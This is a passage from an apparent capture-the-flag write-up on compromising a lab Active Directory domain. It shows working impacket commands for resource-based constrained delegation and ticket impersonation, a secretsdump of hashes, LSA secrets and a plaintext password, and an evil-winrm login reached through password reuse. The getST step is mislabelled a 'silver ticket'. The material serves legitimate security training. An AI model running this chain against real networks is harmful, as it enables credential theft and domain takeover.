TargetName : Domain:batch=TaskScheduler:Task:{013CD3ED-72CB-4801-99D7-8E7CA1F7E370} / <NULL>
UserName   : REFLECTION\Georgia.Price
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential : DBl+5MPkpJg5id
Attributes : 0


mimikatz # exit
Bye!


```
LAPS isn’t configured for WS01, so we can’t replicate what we did with MS01.

But, we can try the RBCD attack now on WS01, since we have control over ‘svc_web_staging’ which has an SPN.

```bash
impacket-rbcd -delegate-from 'svc_web_staging' -delegate-to 'WS01$' -action 'write' 'reflection.vl/Georgia.Price:DBl+5MPkpJg5id'
```

```output
*] Accounts allowed to act on behalf of other identity:
[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)
[*] Delegation rights modified successfully!
[*] svc_web_staging can now impersonate users on WS01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)
[*]     svc_web_staging   (S-1-5-21-3375389138-1770791787-1490854311-1119)

```


lets create a silver ticket
```bash
impacket-getST -spn 'cifs/WS01.reflection.vl' -impersonate 'dom_rgarner' 'reflection.vl/svc_web_staging:DivinelyPacifism98'

```

And now, we can try to run secretsdump on WS01 remotely with the ticket, since dom_rgarner is a domain admin and should have admin privileges on WS01:

```Output
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dom_rgarner
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dom_rgarner@cifs_WS01.reflection.vl@REFLECTION.VL.ccache


```

```bash
export KRB5CCNAME=dom_rgarner@cifs_WS01.reflection.vl@REFLECTION.VL.ccache
```

```bash
impacket-secretsdump -k -no-pass dom_rgarner@WS01.reflection.vl
```


```output
ministrator:500:aad3b435b51404eeaad3b435b51404ee:a29542cb2707bf6d6c1d2c9311b0ff02:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:236728438532f0f1a57360173bda0575:::
labadm:1001:aad3b435b51404eeaad3b435b51404ee:a29542cb2707bf6d6c1d2c9311b0ff02:::
[*] Dumping cached domain logon information (domain/username:hash)
REFLECTION.VL/Rhys.Garner:$DCC2$10240#Rhys.Garner#99152b74dac4cc4b9763240eaa4c0e3d: (2023-06-08 11:17:05+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
REFLECTION\WS01$:plain_password_hex:94918ce11331430b973e40f8e009bd74f1549308bf184a3c324898f9a0fb8f3558d75ed3021053e0fac3832e42bf9f8fa4a102cafdb4b4396e330e7cb89328f4c8de4a083fbf9422ac64fb9a6188d12102322930e6f142d5d583cab23e42809bc70b79a3bbe49f2a806a46079df337c9a7a850154dcc01d8e7c8bd291b80a7d71d6b3ec81c0bba581a546142294c45935b8807b86f6c9519d7e43156526b9c7c4203d40d7e16c61eed56d4b6e488cb70e4e0c8ad88f5328d094a10cca2fcb70f889a0bbd3630381fa7b2fa0d35372e91ca06883b35cfcb280428fe6c595474eb9b9665007818839c2b1788b99e9b22dd
REFLECTION\WS01$:aad3b435b51404eeaad3b435b51404ee:408c25a7d16e6751c46b0792c26ca422:::
[*] DefaultPassword 
reflection.vl\Rhys.Garner:knh1gJ8Xmeq+uP
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xe7b434bbb2fe36946ecafdfab07d4396c039c6e8
dpapi_userkey:0xf772db3cfa86d2d96caf0fc57946c6e7c17511eb
[*] NL$KM 


```

### Password Reuse

Unfortunately, other than the fact that Rhys is a local admin on WS01, I couldn’t find any useful attributes in bloodhound.

And then it hit me! dom_rgarner (the domain admin), stands for “Domain Admin Rhys Garner”. What are the odds that the password is re-used between the two accounts?

```bash
evil-winrm -i dc01.reflection.vl  -u 'dom_rgarner' -p 'knh1gJ8Xmeq+uP'
```


we get the root flag

```bash
Evil-WinRM* PS C:\users\Administrator\Desktop> cat flag.txt
VL{050ec757b24206dec5731c0f7c183d17}
```















